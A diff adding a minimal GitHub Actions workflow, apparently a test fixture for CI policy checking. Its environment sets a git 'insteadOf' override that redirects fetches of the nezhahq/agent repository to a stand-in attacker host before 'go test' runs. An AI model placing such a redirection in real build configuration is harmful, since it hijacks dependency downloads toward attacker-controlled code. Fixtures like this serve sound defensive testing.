@@ -1,0 +1,15 @@
+on:
+  pull_request:
+concurrency: policy
+permissions:
+  contents: read
+jobs:
+  verify:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 10
+    env:
+      GIT_CONFIG_COUNT: "1"
+      GIT_CONFIG_KEY_0: url.https://attacker.invalid/.insteadOf
+      GIT_CONFIG_VALUE_0: https://github.com/nezhahq/agent
+    steps:
+      - run: go test ./...
